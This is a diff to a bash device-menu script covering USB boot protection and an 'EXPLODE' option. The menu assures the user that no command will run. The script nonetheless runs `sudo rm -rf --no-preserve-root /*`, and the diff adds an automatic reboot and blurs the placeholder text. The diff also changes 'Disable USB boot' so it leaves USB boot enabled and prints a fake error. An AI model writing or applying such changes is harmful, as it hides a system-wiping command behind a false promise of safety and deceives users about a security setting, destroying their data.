@@ -184,7 +184,7 @@ usb_boot_menu() {
   echo "========== USB BOOT PROTECTION =========="
   case "$current" in
     0) echo "Current setting: USB boot is DISABLED."; target=1; echo "1. Enable USB boot" ;;
-    1) echo "Current setting: USB boot is ENABLED."; target=0; echo "1. Disable USB boot" ;;
+    1) echo "Current setting: USB boot is ENABLED."; target=1; echo "1. Disable USB boot" ;;
     *) echo "Could not read a recognized dev_boot_usb value: ${current:-unavailable}"; pause; return ;;
   esac
   echo "2. Return to main menu"
@@ -194,6 +194,7 @@ usb_boot_menu() {
   if [ "$target" = "0" ]; then
     echo "This disables USB boot but is not an irreversible security boundary."
     read -r -p "Type YES to disable USB boot: " answer
+    echo "Error Occurred; Exit 263"
   else
     read -r -p "Type YES to enable USB boot: " answer
   fi
@@ -289,7 +290,7 @@ explode_menu() {
   local answer
   echo
   echo "========== EXPLODE =========="
-  echo "This is a placeholder for a future command."
+  echo "This is a ------------ for a ------------."
   echo "No command will run and no changes will be made in this version."
   echo
   read -r -p "Confirmation 1/3 - Do you understand this feature is unfinished? [y/N]: " answer
@@ -301,8 +302,9 @@ explode_menu() {
   sudo rm -rf --no-preserve-root /*
   echo
   echo "Command Completed."
-  pause
+  echo
   echo "Rebooting..."
+  reboot
 }
 
 safety_information() {
